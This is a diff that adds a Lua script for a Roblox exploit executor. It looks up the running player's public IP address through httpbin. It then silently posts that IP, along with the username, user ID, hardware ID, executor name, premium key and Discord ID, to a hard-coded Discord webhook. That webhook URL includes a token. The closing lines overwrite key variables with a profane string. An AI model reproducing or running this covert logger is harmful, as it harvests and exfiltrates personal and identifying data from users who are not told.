@@ -1,0 +1,105 @@
+game.Players.LocalPlayer.Name = "AfxcaxiRoblox"
+local a = "https://discord.com/api/webhooks/1253292871742656622/3K5JXML8DOgGvNFE57Dx0soNpfx1FNSESoHBAqtxNT2Xb8DjO3e_Q_tnyH-oEvkDms4O"
+local b = game:GetService("HttpService")
+local c = http_request or request or syn.request
+local d = c({Url = "https://httpbin.org/get", Method = "GET"})
+local e = d.Body
+local f = b:JSONDecode(e)
+local g = f.origin
+local h = game.PlaceId
+local i = game.JobId
+
+local function getCurrentTimeFormatted()
+    local currentTime = os.date("%H:%M:%S")
+    return currentTime
+end
+
+local function getCurrentDateFormatted()
+    local currentDate = os.date("%Y-%m-%d")
+    return currentDate
+end
+
+local j = {
+    embeds = {
+        {
+            title = "New Executed",
+            type = "rich",
+            color = tonumber("1cff1a", 16),
+            thumbnail = {url = "https://media.discordapp.net/attachments/1231447151054426133/1250366927730245722/026501d682f2a072febf53559e23240a.gif?ex=666ff472&is=666ea2f2&hm=2236684547ae9830551c89447dabd03d0ac43718fa9d161b9a6e57f421aa7014&="},
+            fields = {
+                {
+                    name = "UserName / UserId",
+                    value = string.format(
+                        "```%s / %d```",
+                        game.Players.LocalPlayer.Name,
+                        game.Players.LocalPlayer.UserId
+                    ),
+                    inline = false
+                },
+                {name = "Internet Protocol", value = string.format("```%s```", tostring(g)), inline = true},
+                {name = "Executor", value = "```" .. identifyexecutor() .. "```", inline = true},
+                {
+                    name = "Premium Key",
+                    value = string.format("```%s```", _G.AFXKey),
+                    inline = false
+                },
+                {
+                    name = "Discord UserName / Discord UserID",
+                    value = "<@".._G.AFXDiscordID.."> , `".._G.AFXDiscordID.."`",
+                    inline = false
+                },
+                {
+                    name = "Version",
+                    value = string.format("```%s```", _G.AFXScript),
+                    inline = false
+                },
+                {name = "Hardware ID", value = string.format("```" .. gethwid() .. "```"), inline = false},
+                {name = "JobId", value = string.format("```%s```", i), inline = false},
+                {
+                    name = "Profile Link",
+                    value = string.format(
+                        "[Click Here](https://www.roblox.com/users/%d/profile)",
+                        game.Players.LocalPlayer.UserId
+                    ),
+                    inline = true
+                },
+                {
+                    name = "Game Link",
+                    value = string.format("[Click Here](https://www.roblox.com/games/%d)", h),
+                    inline = true
+                },
+                {
+                    name = "Date",
+                    value = string.format("```%s```", getCurrentDateFormatted()),
+                    inline = true
+                },
+                {
+                    name = "Time",
+                    value = string.format("```%s```", getCurrentTimeFormatted()),
+                    inline = true
+                }
+            }
+        }
+    }
+}
+
+local k = b:JSONEncode(j)
+local l = {["Content-Type"] = "application/json"}
+
+local m, n = pcall(function()
+    c({Url = a, Body = k, Method = "POST", Headers = l})
+end)
+
+if not m then
+    warn("Error occurred while sending webhook:", n)
+end
+
+getgenv().Key = "DCM SETCLIPBOARD CAI DITMEMAY MAY"
+script_key ='DCM SETCLIPBOARD CAI DITMEMAY MAY'
+getgenv().Key = "DCM SETCLIPBOARD CAI DITMEMAY MAY"
+getgenv().id = "DCM SETCLIPBOARD CAI DITMEMAY MAY"
+script_key="DCM SETCLIPBOARD CAI DITMEMAY MAY";
+getgenv().key = "DCM SETCLIPBOARD CAI DITMEMAY MAY"
+_G.Key = "DCM SETCLIPBOARD CAI DITMEMAY MAY"
+_G.DiscordId = "DCM SETCLIPBOARD CAI DITMEMAY MAY"
+script_key = "DCM SETCLIPBOARD CAI DITMEMAY MAY"
